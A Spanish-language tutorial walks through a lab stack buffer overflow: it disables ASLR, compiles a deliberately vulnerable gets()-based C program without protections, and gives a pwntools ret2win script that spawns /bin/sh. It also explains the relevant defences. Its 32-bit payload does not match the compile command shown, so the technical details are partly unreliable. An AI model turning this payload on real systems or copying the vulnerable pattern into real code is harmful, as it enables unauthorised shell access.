# Stack-Based Buffer Overflow

## 1. Introducción
Un **Stack-Based Buffer Overflow** ocurre cuando un programa escribe más datos de los permitidos en un buffer localizado en la pila (stack), sobrescribiendo la dirección de retorno de la función y permitiendo la ejecución de código arbitrario.

En este ejercicio, explotaremos una vulnerabilidad en un programa en C que usa la función insegura `gets()`, permitiendo sobrescribir la dirección de retorno y ejecutar una shell.

---

## 2. Preparación del Entorno

### **Desactivar Protecciones (Solo para Pruebas en Entorno Controlado)**
Algunas protecciones modernas dificultan la explotación de buffer overflows. Para facilitar la prueba:

1. **Desactivar ASLR (Address Space Layout Randomization)**:
   ```bash
   echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
   ```
2. **Compilar el programa sin protecciones**:
   ```bash
   gcc -fno-stack-protector -z execstack -o vulnerable vulnerable.c
   ```
   - `-fno-stack-protector`: Desactiva los canarios en la pila.
   - `-z execstack`: Permite la ejecución en la pila.

---

## 3. Código Vulnerable en C
Guarda el siguiente código como `vulnerable.c`:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void shell() {
    system("/bin/sh"); // Llamada a una shell si logramos redirigir el flujo de ejecución
}

void vulnerable() {
    char buffer[64];
    printf("Introduce tu entrada: ");
    gets(buffer); // Función insegura (puede causar desbordamiento)
    printf("Tu entrada fue: %s\n", buffer);
}

int main() {
    vulnerable();
    return 0;
}
```

Compila el programa:
```bash
gcc -fno-stack-protector -z execstack -o vulnerable vulnerable.c
```

---

## 4. Explotación con Python

### **1. Instalamos pwntools**
```bash
pip install pwntools
```

### **2. Creamos el Exploit en Python**
Guarda este script como `exploit.py`:

```python
from pwn import *

# Dirección de la función shell() en el binario (ajusta según objdump -d vulnerable | grep shell)
shell_addr = p32(0x08049182)  # Ajustar según la compilación

# Construcción del exploit
payload = b"A" * 68  # Relleno hasta la dirección de retorno
payload += shell_addr  # Sobrescribimos la dirección de retorno con la función shell()

# Ejecutar el programa y enviar el payload
p = process("./vulnerable")
p.sendline(payload)
p.interactive()  # Para interactuar con la shell obtenida
```

### **3. Ejecutamos el Exploit**
```bash
python3 exploit.py
```
Si todo sale bien, obtendremos una shell (`/bin/sh`).

---

## 5. Explicación de la Explotación
1. **El buffer es de 64 bytes**, pero la dirección de retorno está después de 4 bytes adicionales, por eso enviamos 68 (`64 + 4`).  
2. **Sobrescribimos la dirección de retorno con la de `shell()`**.
3. **Al ejecutar el programa con la carga maliciosa**, el flujo de ejecución salta a `shell()`, dándonos acceso a una shell del sistema.

---

## 6. Protecciones Contra Stack Overflow
1. **Canarios en la Pila**: Detectan corrupción antes de que la función retorne.
2. **ASLR (Address Space Layout Randomization)**: Aleatoriza direcciones de memoria para evitar predecir la dirección del shellcode.
3. **DEP (Data Execution Prevention)**: Bloquea la ejecución de código en la pila.

---

## 7. Ejercicios Adicionales
- **Modificar el exploit para inyectar shellcode en la pila.**
- **Bypass de ASLR obteniendo direcciones filtradas en la salida del programa.**
- **Ejemplo con Heap Overflow para ver otro tipo de explotación.**

